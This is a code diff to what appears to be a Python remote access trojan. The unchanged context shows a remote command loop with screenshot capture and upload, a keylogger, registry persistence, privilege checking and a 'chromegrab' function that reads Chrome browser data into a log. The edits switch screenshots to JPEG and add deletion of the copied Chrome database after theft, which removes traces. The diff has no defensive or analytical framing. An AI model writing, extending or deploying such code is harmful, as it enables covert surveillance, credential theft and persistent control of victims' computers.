@@ -52,7 +52,7 @@ def upload_file(file_name):
 
 def screenshot():
     myScreenshot = pyautogui.screenshot()
-    myScreenshot.save('screen.png')
+    myScreenshot.save('screen.jpg')
 
 
 def persist(reg_name, copy_name):
@@ -156,7 +156,7 @@ def chrome():
             file_object = open("log.txt", 'a')
             file_object.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
             file_object.close()
-        print("=" * 50)
+        print("=" * 50 + "\n")
 
     cursor.close()
     db.close()
@@ -182,8 +182,8 @@ def shell():
             upload_file(command[9:])
         elif command[:10] == 'screenshot':
             screenshot()
-            upload_file('screen.png')
-            os.remove('screen.png')
+            upload_file('screen.jpg')
+            os.remove('screen.jpg')
         elif command[:12] == 'keylog_start':
             keylog = keylogger.Keylogger()
             t = threading.Thread(target=keylog.start)
@@ -204,6 +204,7 @@ def shell():
             persist(reg_name, copy_name)
         elif command[:10] == "chromegrab":
             chrome()
+            os.remove('ChromeData.db')
         elif command[:9] == "checkpriv":
             check()
         elif command[:7] == 'sendall':
